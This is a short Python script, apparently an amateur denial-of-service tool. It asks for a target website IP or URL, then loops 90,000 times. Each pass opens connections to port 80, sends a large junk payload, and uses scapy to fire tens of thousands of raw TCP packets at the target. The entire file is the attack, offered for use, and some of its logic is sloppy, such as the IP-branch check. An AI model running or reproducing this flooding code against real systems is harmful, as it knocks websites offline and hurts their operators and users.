from socket import  AF_INET,SOCK_STREAM
from scapy.all import *
print ('YOU JUST GOT WHACKED!')

def doss (url):
	s = socket.socket(AF_INET,SOCK_STREAM)
	ip= socket.gethostbyname(url)
	s.connect((ip,80))
	data =b'QAZWSXEDCRFVTGBYHNUJMIK,OL.P;/qazwsxedcrfvtgbyhnujmik,ol.p;1@3#$%$^57^%657'*10000
	send(IP(dst=ip)/TCP(dport=80),count=90000)
	s.send(data)


x = input ('by which do you want to attack??? [1] ip    OR     [2] url  :: ')
if x == 'ip':
	ip = input ('[+] enter website IP : ')
	for i in range (90000):
		doss(ip)

else:
	url = input('[+] enter website URL : ')
	for i in range (90000):
		doss(url)
